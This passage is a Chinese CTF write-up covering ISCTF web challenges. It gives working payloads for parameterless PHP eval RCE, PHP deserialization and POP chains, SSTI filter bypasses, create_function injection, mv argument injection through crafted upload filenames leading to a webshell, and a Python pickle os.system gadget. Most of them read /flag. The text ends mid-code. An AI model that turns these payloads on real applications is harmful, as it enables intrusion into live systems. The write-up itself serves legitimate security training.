---

title: ISCTF
date: 2025-12-04T00:15:16Z
author: Xendr1a


---

# ISCTF（web部分

## b@by n0t1ce b0ard

看题目描述CVE-2024-12233，直接去https://www.cve.org/找![34565933-e064-479f-b67f-84d0a83bf508](/img/ISCTF-web部分/34565933-e064-479f-b67f-84d0a83bf508-20251204002339-h5f9fge.png)

跟进

![1b827770-d9e6-4174-88ad-a61c7405acc5](/img/ISCTF-web部分/1b827770-d9e6-4174-88ad-a61c7405acc5-20251204002806-b6xnujc.png)

对着下面poc复现就行

## ezrce

```php
<?php
highlight_file(__FILE__);

if(isset($_GET['code'])){
    $code = $_GET['code'];
    if (preg_match('/^[A-Za-z\(\)_;]+$/', $code)) {
        eval($code);
    }else{
        die('师傅，你想拿flag？');
    }
}<?php
highlight_file(__FILE__);

if(isset($_GET['code'])){
    $code = $_GET['code'];
    if (preg_match('/^[A-Za-z\(\)_;]+$/', $code)) {
        eval($code);
    }else{
        die('师傅，你想拿flag？');
    }
}
```

只能是字母和这些符号，很容易想到无参rce

```php
?code=eval(end(pos(get_defined_vars())));&a=system('cat /flag');
```

## 来签个到吧

下载出来的包名是unserialize,应该是反序列化

```php
#index.php
<?php
require_once "./config.php";
require_once "./classes.php";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $s = $_POST["shark"] ?? '喵喵喵?';

    if (str_starts_with($s, "blueshark:")) {  //截取
        $ss = substr($s, strlen("blueshark:"));

        $o = @unserialize($ss);

        $p = $db->prepare("INSERT INTO notes (content) VALUES (?)");
        $p->execute([$ss]);//存进数据库

        echo "save sucess!";
        exit(0);
    } else {
        echo "喵喵喵?";
        exit(1);
    }
}

$q = $db->query("SELECT id, content FROM notes ORDER BY id DESC LIMIT 10");
$rows = $q->fetchAll(PDO::FETCH_ASSOC);
?>
```

看到这会接收 POST 参数 shark。如果参数以 `blueshark: `开头，会截取后面的部分进行反序列化，然后写进数据库里面

```php
#classes.php
<?php
class ShitMountant {
    public $url;
    public $logger;

    public function __construct($url) {
        $this->url = $url;
        $this->logger = new FileLogger();
    }

    public function fetch() {
        $c = file_get_contents($this->url);   //文件读取
        if ($this->logger) {
            $this->logger->write("fetched ==> " . $this->url);
        }
        return $c;
    }

    public function __destruct() {
        $this->fetch();
    }
}
?>

```

有个文件读取我们能利用

```php
#api.php
<?php
require_once "./config.php";
require_once "./classes.php";

$id = $_GET["id"] ?? '喵喵喵?';

$s = $db->prepare("SELECT content FROM notes WHERE id = ?");
$s->execute([$id]);
$row = $s->fetch(PDO::FETCH_ASSOC);

if (! $row) {
    die("喵喵喵?");
}

$cfg = unserialize($row["content"]);

if ($cfg instanceof ShitMountant) {
    $r = $cfg->fetch();
    echo "ok!" . "<br>";
    echo nl2br(htmlspecialchars($r));
}
else {
    echo "喵喵喵?";
}
?>

```

我们输入id的特定参数会从数据库取出来反序列化`echo nl2br(htmlspecialchars($r));`这里会回显文件内容

那利用就比较清晰了，我们先构造一下

```php
<?php
class ShitMountant { 
public $url;
public $logger; 
}

$a = new ShitMountant(); 
$a->url = "/flag";
$a->logger = null;
$b=serialize($a);
echo "blueshark:".$b;
```

![82f4979a-2d70-4f71-9537-58aef479fbba](/img/ISCTF-web部分/82f4979a-2d70-4f71-9537-58aef479fbba-20251204010737-eblk3px.png)

访问/api.php?id=2

![aa5ed982-bdf0-4feb-bfa4-bf4718391e16](/img/ISCTF-web部分/aa5ed982-bdf0-4feb-bfa4-bf4718391e16-20251204010824-o7zse1z.png)

## 难过的bottle

懒得分析了直接丢ai![b40e43c7-f6c8-409d-95f8-cbc1c89d2e21](/img/ISCTF-web部分/b40e43c7-f6c8-409d-95f8-cbc1c89d2e21-20251204175444-20sk9k4.png)

过滤了这些

```php
BLACKLIST = ["b","c","d","e","h","i","j","k","m","n","o","p","q","r","s","t","u","v","w","x","y","z","%",";",",","<",">",":","?"]
```

我们构造`&#123;&#123;__import__('os').popen('cat /flag').read()}}`

函数名和变量名可以用全角字符绕过

```php
def ascii_to_fullwidth(text):
    result = []
    for char in text:
        code = ord(char)
        if code == 0x20:
            result.append('\u3000')
        elif 0x21 <= code <= 0x7E:
            result.append(chr(code + 0xFEE0))
        else:
            result.append(char)
    return ''.join(result)

print(ascii_to_fullwidth("read"))
#ｉｍｐｏｒｔ
#ｐｏｐｅｎ
#ｒｅａｄ
```

里面命令可以用进制绕过

```php
&#123;&#123; __ｉｍｐｏｒｔ__('\157\163').ｐｏｐｅｎ('\143\141\164\040\057\146\154\141\147').ｒｅａｄ() &#125;&#125;
```

然后打包成zip文件上传

![a76314c6-5ad9-40aa-804e-90d5011f3ea7](/img/ISCTF-web部分/a76314c6-5ad9-40aa-804e-90d5011f3ea7-20251204181023-dx4wg0u.png)

查看就行了

## flag到底在哪

看题目描述

```php
小蓝鲨部署了一个网页项目，但是怎么403啊，好像什么爬虫什么的
然后hint:小蓝鲨说账户必须是admin哦，不要在用户名上做尝试啦! 如果要使用逻辑运算符请使用大写
```

爬虫的话可以联想到robots.txt

![3086283c-32ae-4f2b-a600-a365b0a91285](/img/ISCTF-web部分/3086283c-32ae-4f2b-a600-a365b0a91285-20251204181304-ac4ngjn.png)

逻辑运算符，猜到了是万能密码

![c2151a5d-f166-459e-94a7-51c4208007b0](/img/ISCTF-web部分/c2151a5d-f166-459e-94a7-51c4208007b0-20251204181407-pgjudzg.png)

然后上传一句话木马，flag在环境变量

## **flag？我就借走了**

![91534e53-f9b2-4286-b3c1-bdd36c69a672](/img/ISCTF-web部分/91534e53-f9b2-4286-b3c1-bdd36c69a672-20251204181735-ryqym6n.png)

说了打包格式用tar，可以试试软链接

```php
ln -s /flag flag
tar -cvf flag.tar flag
```

![ba30a5963087cd62958834290d7aeff4](/img/ISCTF-web部分/ba30a5963087cd62958834290d7aeff4-20251204185325-6o53768.png)

上传过去![5f71830f-c548-4a9a-a1d2-cb0fa0da083e](/img/ISCTF-web部分/5f71830f-c548-4a9a-a1d2-cb0fa0da083e-20251204185354-rpje1yz.png)

点进去看就行了

## Who am I

先创个账号登入，![288ff1be-cd1a-4763-901c-6a162c2e6b7c](/img/ISCTF-web部分/288ff1be-cd1a-4763-901c-6a162c2e6b7c-20251204191133-1jecmwd.png)

多出一个type，我们改成0试试![ed6b8fe0-d54e-4fd0-9127-e83aa8e3eed5](/img/ISCTF-web部分/ed6b8fe0-d54e-4fd0-9127-e83aa8e3eed5-20251204191210-3i8ng80.png)

访问这个路由，多了个配置文件，先看到了个waf

```python
@app.route('/impression',methods=['GET'])
def impression():
    point=request.args.get('point')
    if len(point) > 5:
        return "Invalid request"
    List=["{","}",".","%","<",">","_"]
    for i in point:
        if i in List:
            return "Invalid request"
    return render_template(point)
```

长度限制加符号禁用，基本上应该不是ssti了

```python
@app.route('/operate',methods=['GET'])
def operate():
    username=request.args.get('username')
    password=request.args.get('password')
    confirm_password=request.args.get('confirm_password')
    if username in globals() and "old" not in password:
        Username=globals()[username] # 获取全局对象
        try:
            # 利用 pydash可以通过字符串来修改对象的深层属性
            pydash.set_(Username,password,confirm_password)
            return "oprate success"
        except:
            return "oprate failed"
```

这里pydash.set_存在属性污染，app存在于 globals() 中，我们可以控制username\=app，从而利用pydash.set\_ 修改Flask 应用的内部render_template的配置，让其本来指向templates文件夹变成指向根目录

```python
pydash.set_(obj, path, value)
obj->目标 path->目标路径 value->新值
```

render_template指向**templates文件夹**与`jinja_loader.searchpath.0`相同，然后我们来构造payload

```http
GET /operate?username=app&password=jinja_loader.searchpath.0&confirm_password=/
```

先污染属性，然后查看

```http
GET /impression?point=flag
```

## Bypass

```php
<?php
class FLAG
{
    private $a;
    protected $b;
    public function __construct($a, $b)
        {
            $this->a = $a;
            $this->b = $b;
            $this->check($a,$b);
            eval($a.$b);
        }
    public function __destruct(){
            $a = (string)$this->a;
            $b = (string)$this->b;
            if ($this->check($a,$b)){
                $a("", $b);
            }
            else{
                echo "Try again!";
            }
        }
    private function check($a, $b) {
        $blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
        $blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

        $pattern_a = '/' . implode('|', array_map('preg_quote', $blocked_a, ['/'])) . '/i';
        $pattern_b = '/' . implode('|', array_map('preg_quote', $blocked_b, ['/'])) . '/i';

        if (preg_match($pattern_a, $a) || preg_match($pattern_b, $b)) {
            return false;
        }
        return true;
    }  
}


if (isset($_GET['exp'])) {
    $p = unserialize($_GET['exp']);
    var_dump($p);
}else{
    highlight_file("index.php");
}
```

给了源码和dockerfile，是php:7.1.30-fpm-alpine

```php
$blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];
```

可以看到ban了挺多的，但是看到\$a('', \$b);并且为7.1版本的话可以使用create_function，然后参数的话没有ban数字可以用8进制绕过

```php
<?php
class FLAG
{
    private $a;
    protected $b;
    public function __construct()
    {
        $this->a = "create_function";
        $this->b = '}"\163\171\163\164\145\155"("\143\141\164\40\57\146\154\141\147");//';
    }
}

$obj = new FLAG();
$payload = serialize($obj);
echo urlencode($payload);
?>
//就等于function __lambda_func($args){ }"system"("cat /flag");// }
```

## mv\_upload

首先扫目录扫到index.php~,看源码

```php
<?php
$uploadDir = '/tmp/upload/'; // 临时目录
$targetDir = '/var/www/html/upload/'; // 存储目录

$blacklist = [
    'php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht','jsp', 'jspa', 'jspx', 'jsw', 'jsv', 'jspf', 'jtml','asp', 'aspx', 'ascx', 'ashx', 'asmx', 'cer', 'aSp', 'aSpx', 'cEr', 'pHp','shtml', 'shtm', 'stm','pl', 'cgi', 'exe', 'bat', 'sh', 'py', 'rb', 'scgi','htaccess', 'htpasswd', "php2", "html", "htm", "asa", "asax",  "swf","ini"
];

$message = '';
$filesInTmp = [];

// 创建目标目录
if (!is_dir($targetDir)) {
    mkdir($targetDir, 0755, true);
}

if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

// 上传临时目录
if (isset($_POST['upload']) && !empty($_FILES['files']['name'][0])) {
    $uploadedFiles = $_FILES['files'];
    foreach ($uploadedFiles['name'] as $index => $filename) {
        if ($uploadedFiles['error'][$index] !== UPLOAD_ERR_OK) {
            $message .= "文件 {$filename} 上传失败。<br>";
            continue;
        }

        $tmpName = $uploadedFiles['tmp_name'][$index];

        $filename = trim(basename($filename));
        if ($filename === '') {
            $message .= "文件名无效，跳过。<br>";
            continue;
        }

        $fileParts = pathinfo($filename);
        $extension = isset($fileParts['extension']) ? strtolower($fileParts['extension']) : '';

        $extension = trim($extension, '.');

        if (in_array($extension, $blacklist)) {
            $message .= "文件 {$filename} 因类型不安全（.{$extension}）被拒绝。<br>";
            continue;
        }

        $destination = $uploadDir . $filename;

        if (move_uploaded_file($tmpName, $destination)) {
            $message .= "文件 {$filename} 已上传至 $uploadDir$filename 。<br>";
        } else {
            $message .= "文件 {$filename} 移动失败。<br>";
        }
    }
}

// 获取临时目录中的所有文件
if (is_dir($uploadDir)) {
    $handle = opendir($uploadDir);
    if ($handle) {
        while (($file = readdir($handle)) !== false) {
            if (is_file($uploadDir . $file)) {
                $filesInTmp[] = $file;
            }
        }
        closedir($handle);
    }
}

// 处理确认上传完毕（移动文件）
if (isset($_POST['confirm_move'])) {
    if (empty($filesInTmp)) {
        $message .= "没有可移动的文件。<br>";
    } else {
        $output = [];
        $returnCode = 0;
        exec("cd $uploadDir ; mv * $targetDir 2>&1", $output, $returnCode);
        if ($returnCode === 0) {
            foreach ($filesInTmp as $file) {
                $message .= "已移动文件: {$file} 至$targetDir$file<br>";
            }
        } else {
            $message .= "移动文件失败: " .implode(', ', $output)."<br>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>多文件上传服务</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .container { max-width: 800px; margin: auto; }
        .alert { padding: 10px; margin: 10px 0; background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .success { background: #d4edda; color: #155724; border-color: #c3e6cb; }
        ul { list-style-type: none; padding: 0; }
        li { margin: 5px 0; padding: 5px; background: #f0f0f0; }
    </style>
</head>
<body>
<div class="container">
    <h2>多文件上传服务</h2>

    <?php if ($message): ?>
        <div class="alert <?= strpos($message, '失败') ? '' : 'success' ?>">
            <?= $message ?>
        </div>
    <?php endif; ?>

    <form method="POST" enctype="multipart/form-data">
        <label for="files">选择文件：</label><br>
        <input type="file" name="files[]" id="files" multiple required>
        <button type="submit" name="upload">上传到临时目录</button>
    </form>

    <hr>

    <h3>待确认上传文件</h3>
    <?php if (empty($filesInTmp)): ?>
        <p>暂无待确认上传文件</p>
    <?php else: ?>
        <ul>
            <?php foreach ($filesInTmp as $file): ?>
                <li><?= htmlspecialchars($file) ?></li>
            <?php endforeach; ?>
        </ul>
        <form method="POST">
            <button type="submit" name="confirm_move">确认上传完毕，移动到存储目录</button>
        </form>
    <?php endif; ?>
</div>
</body>
</html>
```

设置了一个非常严格的waf，试了php2，php3，phar依旧没用

```php
$blacklist = [
    'php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phps', 'pht','jsp', 'jspa', 'jspx', 'jsw', 'jsv', 'jspf', 'jtml','asp', 'aspx', 'ascx', 'ashx', 'asmx', 'cer', 'aSp', 'aSpx', 'cEr', 'pHp','shtml', 'shtm', 'stm','pl', 'cgi', 'exe', 'bat', 'sh', 'py', 'rb', 'scgi','htaccess', 'htpasswd', "php2", "html", "htm", "asa", "asax",  "swf","ini"
];
```

按照题目名字以及代码来看大概率是这块能利用

```php
if (isset($_POST['confirm_move'])) {
    if (empty($filesInTmp)) {
        $message .= "没有可移动的文件。<br>";
    } else {
        $output = [];
        $returnCode = 0;
        exec("cd $uploadDir ; mv * $targetDir 2>&1", $output, $returnCode);
        if ($returnCode === 0) {
            foreach ($filesInTmp as $file) {
                $message .= "已移动文件: {$file} 至$targetDir$file<br>";
            }
        } else {
            $message .= "移动文件失败: " .implode(', ', $output)."<br>";
        }
    }
}
```

我们能看到exec，有个mv命令

```txt
exec("cd $uploadDir ; mv * $targetDir 2>&1", $output, $returnCode);
这里的命令就等于：
cd /tmp/upload ; mv * /var/www/html/upload
这里的 * 会被 Shell 扩展为当前目录下的所有文件名。
```

我们看看mv的参数

```txt
──(kali1㉿kali)-[~/桌面]
└─$ mv --help
用法：mv [选项]... [-T] 源 目标
　或：mv [选项]... 源... 目录
　或：mv [选项]... -t 目录 源...
将 <源> 重命名为 <目标>，或将 <源> 移动至 <目录>。

长选项的必选参数对于短选项也是必选的。
      --backup[=控制]          为每个已存在的目标文件创建备份
  -b                           类似 --backup，但不接受任何参数
      --debug                  解释文件是如何复制的。隐含启用 -v
      --exchange               交换源和目标
  -f, --force                  覆盖前不询问
  -i, --interactive            覆盖前询问
  -n, --no-clobber             不覆盖已存在的文件
如果您指定了 -i、-f、-n 中的多个，仅最后一个生效。
      --no-copy                如果重命名失败，则不复制
      --strip-trailing-slashes  去掉每个 <源> 尾部的斜杠
  -S, --suffix=后缀            替换通常使用的备份文件后缀
  -t, --target-directory=目录  将所有 <源> 参数移动到 <目录>
  -T, --no-target-directory    将 <目标> 视为普通文件
  --update[=更新]              控制更新哪些已存在的文件；
                                 <更新>={all,none,none-fail,older（默认）}。
  -u                           等价于 --update[=older]。见下
  -v, --verbose                显示详细步骤
  -Z, --context                将目标文件的 SELinux 安全上下文设置为
                                 默认类型
      --help        显示此帮助信息并退出
      --version     显示版本信息并退出

```

可以使用--backup（或者-b)和--suffix=php来修改文件后缀名,当目录下有一个重名的文件时，并且--backup存在，mv并不会覆盖旧的，又因为--suffix=php的存在，mv会决定把后缀添加进去

我们需要构造这样的命令

```bash
mv --backup --suffix=php Xendria. /var/www/html/upload
```

为了让其先内先有个文件来让它重名，我们可以先传个一句话木马，文件名为`Xendria.`，然后存储进去

然后依次传入三个文件名进入临时存储构造命令

![da70b5d1-730a-4bce-8234-f447beb677ea](/img/ISCTF-web部分/da70b5d1-730a-4bce-8234-f447beb677ea-20251211153558-bc354fu.png)

一起移动到存储目录，然后去找flag就行![fcd9486e-d24c-4844-900c-eee46751f05b](/img/ISCTF-web部分/fcd9486e-d24c-4844-900c-eee46751f05b-20251211153719-ly9wu1e.png)

## ezpop

```php
<?php
error_reporting(0);

class begin {
    public $var1;
    public $var2;

    function __construct($a)
    {
        $this->var1 = $a;
    }
    function __destruct() {
        echo $this->var1;
    }

    public function __toString() {
        $newFunc = $this->var2;
        return $newFunc();
    }
}


class starlord {
    public $var4;
    public $var5;
    public $arg1;

    public function __call($arg1, $arg2) {
        $function = $this->var4;
        return $function();
    }

    public function __get($arg1) {
        $this->var5->ll2('b2');
    }
}

class anna {
    public $var6;
    public $var7;

    public function __toString() {
        $long = @$this->var6->add();
        return $long;
    }

    public function __set($arg1, $arg2) {
        if ($this->var7->tt2) {
            echo "yamada yamada";
        }
    }
}

class eenndd {
    public $command;

    public function __get($arg1) {
        if (preg_match("/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i", $this->command)){
            echo "nonono";
        }else {
            eval($this->command);
        }
    }
}

class flaag {
    public $var10;
    public $var11="1145141919810";

    public function __invoke() {
        if (md5(md5($this->var11)) == 666) {
            return $this->var10->hey;
        }
    }
}


if (isset($_POST['ISCTF'])) {
    unserialize($_POST["ISCTF"]);
}else {
    highlight_file(__FILE__);
}
```

一般链子我们感觉可以倒着找，

```php
class eenndd {
    public $command;

    public function __get($arg1) {
        if (preg_match("/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i", $this->command)){
            echo "nonono";
        }else {
            eval($this->command);
        }
    }
}
```

注意到这里有个eval和waf，很明显是终点，这里waf不是很严格，我们可以用base64来绕过，利用readfile来读/flag，

​`readfile(base64_decode('L2ZsYWc='));`

看到`__get`方法，我们找找哪里会触发

```php
class flaag {
    public $var10;
    public $var11="1145141919810";

    public function __invoke() {
        if (md5(md5($this->var11)) == 666) {
            return $this->var10->hey;   //这里会触发get方法
        }
    }
}
```

这里有个弱比较，我们可以来个脚本找数字

```php
<?php
for($i=0; $i<1000000; $i++){
    if(md5(md5($i)) == 666){
        $found_num = $i;
        break;
    }
}
echo $found_num;   //为213
```

然后我们再找找哪里会触发`__invoke`，尝试将一个对象像函数一样调用时就会触发

```php
class begin {
    public $var1;
    public $var2;

    function __construct($a)
    {
        $this->var1 = $a;
    }
    function __destruct() {
        echo $this->var1;
    }

    public function __toString() {
        $newFunc = $this->var2;
        return $newFunc(); //看到这里
    }
}
```

那我们过程已经理清楚了，直接构造

```php
<?php
class begin {
    public $var1;
    public $var2;
}
class flaag {
    public $var10;
    public $var11;
}
class eenndd {
    public $command;
}

$d = new eenndd();
$d->command = "readfile(base64_decode('L2ZsYWc='));"; 
$c = new flaag();
$c->var10 = $d;
$c->var11 = 213;
$b = new begin();
$b->var2 = $c;
$a = new begin();
$a->var1 = $b;
echo urlencode(serialize($a));
?>
```

## 双生序列

挺多文件的

```php
#index.php
<?php
require_once "config.php";
require_once "classes.php";

$shark = "blueshark:";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $s = $_POST["s"] ?? "喵喵喵?";

    if (str_starts_with($s, $shark)) {
        $ss = substr($s, strlen($shark));
        $p = $db->prepare("INSERT INTO notes (content) VALUES (?)");
        $p->execute([$ss]);

        echo "save sucess";
        exit(0);
    }
    else {
        echo "喵喵喵?";
        exit(1);
    }
}

$q = $db->query("SELECT id, content FROM notes ORDER BY id DESC LIMIT 10");
$rows = $q->fetchAll(PDO::FETCH_ASSOC);
?>

<!doctype html>
<html>
<head>
    <meta charset="utf-8" />
    <title>宝宝你是一只猫猫</title>
    <style>
        body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; padding: 24px; }
        textarea { width: 100%; max-width: 800px; height: 120px; font-family: monospace; }
        .recent { margin-top: 20px; max-width: 900px; }
        .note { background:#f7f7f8; padding:10px; border-radius:6px; margin-bottom:8px; font-family: monospace; white-space:pre-wrap; }
        .meta { color:#666; font-size:90%; margin-bottom:6px; }
        .btn { padding:8px 14px; border-radius:6px; border:1px solid #ccc; background:#fff; cursor:pointer; }
    </style>
</head>
<body>
<h1>SharkHub</h1>

<form method="POST" style="max-width:900px; margin-bottom:18px;">
    <p>你喜欢小蓝鲨吗？</p>
    <br/>
    <textarea id="s" name="s" placeholder=""></textarea><br/>
    <br/>
    <button class="btn" type="submit">commit</button>
</form>

<form method="GET" action="run.php" style="margin-bottom:18px;">
    <input type="hidden" name="action" value="run">
    <button class="btn" type="submit">喵喵喵</button>
</form>

<div class="recent">
    <h2>Recent</h2>
    <?php foreach ($rows as $r): ?>
        <div class="note">
            <div class="meta">#<?= htmlspecialchars($r['id'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></div>
            <div><?= htmlspecialchars($r['content'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></div>
        </div>
    <?php endforeach; ?>
</div>
</body>
</html>
```

主要就是数据存储，用户输入的内容以"blueshark:"开头，则截取该字符串后的部分，并将其插入到数据库中的notes表内。

看看pytools.py

```py
import os
import pickle
import json
import hmac
import hashlib
import time
import random
import time
import sys
import io

class RCE:
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd",))

class Set:
    def __init__(self):
        self.secret = b""
        self.payload = b""

    def __setstate__(self, state):
        self.secret = state.get("secret", b"")
        self.payload = state.get("payload", b"")

class Unpickler(pickle.Unpickler):
    allows = {
        ("__main__", "Set")
    }

    def find_class(self, module, name):
        if (module, name) in self.allows:
            return super().find_class(module, name)
        raise pickle.UnpicklingError("喵喵喵?")

class ssxl:
    def __init__(self):
        self.ROOT = "/tmp/ssxl"
        self.BIN = f"{self.ROOT}/write.bin"
        self.META = f"{self.ROOT}/write.meta"
        self.OUTS = f"{self.ROOT}/outs.txt"
        self.SECRET = b""
        self.jmp = True   # 你能设置这个吗😋

    def _set_secret(self, data):
        bio = io.BytesIO(data)
        obj = Unpickler(bio).load()
        
        if not isinstance(obj, Set):
            Games().gen_redirect()
            return "喵喵喵?"

        if isinstance(getattr(obj, "secret", b""), (bytes, bytearray)):
            self.SECRET = obj.secret

        return obj

    def init(self):
        r = 0
        if not os.path.exists(self.ROOT):
            print("==> no ROOT")
            r = 1
        if not os.path.exists(self.BIN):
            print("==> no BIN")
            r = 1
        if not os.path.exists(self.META):
            print("==> no META")
            r = 1
        return r == 0

    def load_bin(self):
        with open(self.BIN, "rb") as bf:
            return bf.read()

    def load_meta(self):
        with open(self.META, "r", encoding="utf-8", errors="ignore") as jf:
            return json.load(jf)

    def sig_check(self, meta, data):
        sig = meta.get("sig")
        ts = meta.get("ts")
        calc = hmac.new(self.SECRET, data, hashlib.sha256).hexdigest()

        if not isinstance(sig, str) or not hmac.compare_digest(sig, calc):
            print("==> sig check failed")
            return False

        if ts and (time.time() - float(ts) > 600):
            print("==> ts check failed")
            return False

        return True

    def read_out(self):
        if not os.path.exists(self.OUTS):
            raise FileNotFoundError(self.OUTS)
        with open(self.OUTS, "r", encoding="utf-8", errors="ignore") as of:
            content = of.read()
        return content or "喵喵喵?"

    def run(self):
        assert self.init()
        data = self.load_bin()

        try:
            obj = self._set_secret(data)
        except Exception as e:
            print("==> pickle load failed\n", e)
            if self.jmp:
                Games().gen_redirect()
            return

        meta = self.load_meta()
        assert self.sig_check(meta, data)

        print("==> obj => ", obj)

        payload = getattr(obj, 'payload', None)
 
        open(self.OUTS, "w").close()

        if isinstance(payload, (bytes, bytearray)):
            try:
                inner = pickle.loads(payload)
            except Exception as e:
                print("==> inner pickle load failed\n", e)
                if self.jmp:
                    Games().gen_redirect()
                return

        try:
            out = self.read_out()
        except Exception as e:
            print("==> no outs =>\n", e)
            if self.jmp:
                Games().gen_redirect()
            return

        print("==> out => ", out)


class ret2game(Exception):
    def __init__(self, url):
        super().__init__()
        self.url = url
    
    def __str__(self):
        r = 'Redirect to: ' + self.url
        return r

    def to_html(self):
        template = f'''
<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <title>喵喵喵……</title>
        <script>
            location.replace("{self.url}");
        </script>
        <style>
            body&#123;&#123;font-family:system-ui;padding:24px&#125;&#125;
        </style>
    </head>
    <body>
        <p>恭喜你抽到：<a href="{self.url}">{self.url}</a></p>
    </body>
</html>
        '''
        return template

class Games:
    def __init__(self):
        urls = {
            "isctf": "https://isctf2025.bluesharkinfo.com/",
            "blueshark": "https://www.bluesharkinfo.com/",
            "yuanshen": "https://ys.mihoyo.com/main/",
            "bengtie": "https://sr.mihoyo.com/main",
            "sanguosha": "https://www.sanguosha.com/",
            "huoying": "https://hyrz.qq.com/main.shtml",
            "diwurenge": "https://id5.163.com/",
            "mingchao": "https://mc.kurogames.com/main",
            "wzry": "https://pvp.qq.com/",
            "sanjiaozhou": "https://df.qq.com/main.shtml",
            "wuweiqiyue": "https://val.qq.com/main.html",
            "dota2": "https://www.dota2.com.cn/",
            "lol": "https://lol.qq.com/main.shtml"
        }
        self.urls = list(urls.values())
        self.weights = [5, 3] + [1] * (len(urls) - 2)

    def gen_url(self):
        url = random.choices(self.urls, weights=self.weights, k=1)[0]
        return url

    def gen_redirect(self):
        url = self.gen_url()
        raise ret2game(url)

try:
    challenge = ssxl()
    challenge.run()
except ret2game as e:
    sys.stdout.write(e.to_html())
    sys.stdout.flush()


```

先看到RCE这

```py
class RCE:
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd",))
```

在Python中，\_\_reduce\_\_是一个特殊方法，它用于对象的序列化。当你使用pickle模块来序列化一个对象时，pickle模块会调用对象的\_\_reduce\_\_方法，如果该方法存在的话。那我们反序列化时就能搁着控制命令。

```py
    def run(self):
        assert self.init()
        data = self.load_bin()

        try:
            obj = self._set_secret(data)
        except Exception as e:
            print("==> pickle load failed\n", e)
            if self.jmp:
                Games().gen_redirect()
            return

        meta = self.load_meta()
        assert self.sig_check(meta, data)

        print("==> obj => ", obj)

        payload = getattr(obj, 'payload', None)
 
        open(self.OUTS, "w").close()

        if isinstance(payload, (bytes, bytearray)):
            try:
                inner = pickle.loads(payload)  #当 pickle.loads 处理这段字节流时，为了还原对象，它会执行__reduce__ 里的代码。
            except Exception as e:
                print("==> inner pickle load failed\n", e)
                if self.jmp:
                    Games().gen_redirect()
                return

        try:
            out = self.read_out()
        except Exception as e:
            print("==> no outs =>\n", e)
            if self.jmp:
                Games().gen_redirect()
            return

        print("==> out => ", out)
```

这里有个逻辑错误，它是直接先执行了`_set_secret`​，再检查的签名，我们跟进一下这个`_set_secret`

```py
    def _set_secret(self, data):
        bio = io.BytesIO(data)
        obj = Unpickler(bio).load()
        
        if not isinstance(obj, Set):
            Games().gen_redirect()
            return "喵喵喵?"

        if isinstance(getattr(obj, "secret", b""), (bytes, bytearray)):
            self.SECRET = obj.secret

        return obj
```

如果解包出来的对象有 secret 属性，就把`self.SECRET`覆盖掉，我们看到run.php

```php
<?php
require_once "./config.php";
require_once "./classes.php";

$action = $_GET["action"] ?? "喵喵喵?";

if ($action !== "run") {
    echo "喵喵喵?";
    exit(1);
}

$binfile = "/tmp/ssxl/run.bin";

if (!file_exists($binfile)) {
    echo "喵喵喵?";
    exit(1);
}

$data = @file_get_contents($binfile);
if ($data === false) {
    echo "喵喵喵?";
    exit(1);
}

$allowed = ["Pytools"];
$exec = @unserialize($data, ["allowed_classes" => $allowed]);

if (!is_object($exec)) {
    echo "喵喵喵?";
    exit(1);
}
if (get_class($exec) !== "Pytools") {
    echo "喵喵喵?";
    exit(1);
}

if (method_exists($exec, "__call")) {
    ob_start();
    try {
        $ret = $exec->blueshark(); //这里调用了一个不存在的方法，应该是触发__call
        $out = ob_get_clean();

        if ($out !== "") {
            echo $out;
        }
        else if ($ret !== null) {
            echo $ret;
        }
        else {
            echo "喵喵喵?";
        }
    }
    catch (Throwable $e) {
        echo "喵喵喵?";
        ob_end_clean();
    }

    exit(0);
}
?>


```

这里面有个反序列化入口`@unserialize(`$data, ["allowed_classes" =>$​`allowed]);`，以及提到了run.bin，以及限制了只允许反序列化 Pytools 类

看到api.php

```php

#api.php
<?php
require_once "config.php";
require_once "classes.php";

$cat = new Cat();

$id = $_GET["id"] ?? "喵喵喵?";

if (!is_numeric($id)) {
    $cat->OwO();
    exit(1);
}

$s = $db->prepare("SELECT content FROM notes WHERE id = ?");
$s->execute([$id]);

$row = $s->fetch(PDO::FETCH_ASSOC);

if (!$row) {
    $cat->OwO();
    exit(1);
}

$allowed = ["Writer", "Shark", "Bridge"];
$o = @unserialize($row["content"], ["allowed_classes" => $allowed]);

if (!($o instanceof Bridge)) {
    $cat->OwO();
    exit(1);
}

$r = $o->fetch();
echo nl2br(htmlspecialchars($r));
?>


```

这也有个反序列化入口，允许["Writer", "Shark", "Bridge"];，就是从数据库拿东西出来反序列化

再看到classes.php

```php
#classes.php
class Writer {
    public $b64data = "";
    private $binfile = "/tmp/ssxl/write.bin";
    private $metafile = "/tmp/ssxl/write.meta";
    private $secret = "kaqikaqi";
    public $init = '喵喵喵?';

    public function __construct($b64data="") {
